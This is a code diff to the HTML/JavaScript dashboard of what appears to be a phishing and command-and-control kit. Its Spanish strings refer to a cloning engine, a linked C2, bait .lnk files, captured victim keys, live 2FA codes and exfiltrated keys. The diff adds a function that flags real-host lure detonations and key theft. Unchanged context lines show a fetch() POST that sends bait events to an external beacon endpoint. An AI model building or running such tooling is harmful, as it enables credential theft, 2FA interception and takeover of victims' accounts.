@@ -361,7 +361,7 @@ footer .sep{color:#262b33}
   <span>SYNC <b id="ftSync">--:--:--</b></span><span class="sep">|</span>
   <span>BEACONS <b id="ftB">0</b></span><span class="sep">|</span>
   <span>UPTIME <b id="ftU">00:00:00</b></span><span class="sep">|</span>
-  <span id="ftVer">RC-T20 vRC20 · MOTOR CLONE v13.4</span>
+  <span id="ftVer">RC-T20 vRC21 · MOTOR CLONE v13.4</span>
 </footer>
 <div id="modal">
   <div class="mbox">
@@ -470,6 +470,27 @@ function ceboCrear() {
   fetch('https://base44.app/api/apps/6ad92becd6c36ebeb23d3e71/functions/t20Beacon', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ marker: 'H2-CEBO-FABRICADO', ua: 'consola-owner', extra: JSON.stringify({ nombre: n, tipo: '.' + ceboTipo, origen: 'local-dispositivo' }) }) }).catch(e => {});
 }
 ceboExt('lnk');
+function scanLeds() {
+  const op = localStorage.getItem('t20v8_op') || 't20';
+  let intruso = false, alarma = false;
+  if (op === 'h2') {
+    // H2 0-click: intruso = detonacion desde un host real (no infra de lab); alarma = llaves exfiltradas
+    S.h2.forEach(e => {
+      const esDet = /^H2-(LNK|EXEC|ST|OPEN)/.test(String(e.m||''));
+      const infra = /RUNNER|CONSOLA|OWNER|LAB|VERIFIER/i.test(String(e.ex||'') + ' ' + String(e.id||''));
+      if (esDet && !infra) intruso = true;
+      if (/^H2-KEYS-EXFIL/.test(String(e.m||''))) alarma = true;
+    });
+  } else {
+    // T-20: intruso = victima con llave o codigo capturado; alarma = codigo 2FA en vivo
+    Object.values(S.targets).forEach(t => {
+      if (t.key || t.code) intruso = true;
+      if (t.code) alarma = true;
+    });
+  }
+  $('ledLive').className = 'led' + (intruso ? ' rec' : '');
+  $('ledAlm').className = 'led' + (alarma ? ' warn' : '');
+}
 function renderH2() {
   const has = p => S.h2.some(e => String(e.m).indexOf(p) === 0);
   if (!S.h2.length) return;
@@ -548,6 +569,7 @@ function renderH2() {
         + '<div style="font-size:8px;color:#5c626c;margin-top:3px">' + esc(e.at) + '</div></div>';
     }).join('');
   }
+  scanLeds();
 }
 function h2Hide(bid) {
   const h = JSON.parse(localStorage.getItem('h2hid') || '[]');
@@ -667,9 +689,7 @@ function renderAll() {
   }
   $('noTgt').style.display = any ? 'none' : 'block';
   $('ftB').textContent = S.beacons;
-  const live = S.activeUid && S.targets[S.activeUid] && (S.targets[S.activeUid].key || S.targets[S.activeUid].code);
-  $('ledLive').className = 'led' + (live ? ' rec' : '');
-  $('ledAlm').className = 'led' + (S.targets[S.activeUid] && S.targets[S.activeUid].code ? ' warn' : '');
+  scanLeds();
   renderMaterial(); renderIntercept(); renderArsenal();
 }
 
@@ -972,7 +992,7 @@ setInterval(() => {
 }, 1000);
 
 applyOp(localStorage.getItem('t20v8_op') || 't20');
-logAdd('RC-T20 vRC20 en línea · motor de clonación v13.4 · C2 enlazado', 'warn');
+logAdd('RC-T20 vRC21 en línea · motor de clonación v13.4 · C2 enlazado', 'warn');
 renderAll();
 poll();
 </script>
